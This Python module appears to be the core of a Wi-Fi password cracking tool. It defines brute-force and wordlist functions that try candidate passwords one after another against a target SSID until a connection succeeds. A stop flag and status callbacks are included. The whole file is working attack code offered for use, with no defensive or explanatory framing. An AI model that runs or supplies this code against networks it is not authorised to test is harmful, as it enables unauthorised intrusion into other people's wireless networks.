from password_gen import password_generator
from wifi_utils import connect_to_wifi
import time

stop_flag = False

def crack_wifi_bruteforce(wifi_ssid, card, update_status_callback=None, charset=None, encryption="WPA2", max_attempts=None):
    global stop_flag
    attempt = 0
    for pwd in password_generator(min_length=6, charset=charset):
        if stop_flag:
            if update_status_callback:
                update_status_callback("Stopped.", attempt, max_attempts)
            return None, attempt
        attempt += 1
        if update_status_callback:
            update_status_callback(pwd, attempt, max_attempts)
        if connect_to_wifi(pwd, wifi_ssid, card, encryption=encryption):
            return pwd, attempt
        if max_attempts and attempt >= max_attempts:
            break
    if update_status_callback:
        update_status_callback("Finished.", attempt, max_attempts)
    return None, attempt

def crack_wifi_wordlist(wifi_ssid, card, wordlist, update_status_callback=None, encryption="WPA2"):
    global stop_flag
    attempt = 0
    total = len(wordlist)
    for pwd in wordlist:
        if stop_flag:
            if update_status_callback:
                update_status_callback("Stopped.", attempt, total)
            return None, attempt
        attempt += 1
        if update_status_callback:
            update_status_callback(pwd, attempt, total)
        if connect_to_wifi(pwd, wifi_ssid, card, encryption=encryption):
            return pwd, attempt
    if update_status_callback:
        update_status_callback("Finished.", attempt, total)
    return None, attempt

def set_stop_flag(val=True):
    global stop_flag
    stop_flag = val

def reset_stop_flag():
    global stop_flag
    stop_flag = False